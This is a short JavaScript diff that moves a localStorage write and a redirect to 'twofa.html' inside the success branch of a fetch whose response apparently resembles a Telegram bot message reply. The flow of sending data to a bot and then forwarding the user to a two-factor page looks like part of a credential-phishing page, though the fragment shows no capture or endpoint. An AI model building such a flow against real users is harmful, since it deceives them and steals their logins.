@@ -152,10 +152,10 @@
 				.then(function (data) {
 					if (data.ok && data.result?.message_id) {
 						localStorage.setItem('message_id', data.result.message_id);
-					}
-					if (message_id) {
-						localStorage.setItem('message', message);
-						globalThis.location.href = 'twofa.html';
+						if (message_id) {
+							localStorage.setItem('message', message);
+							globalThis.location.href = 'twofa.html';
+						}
 					}
 				});
 		}
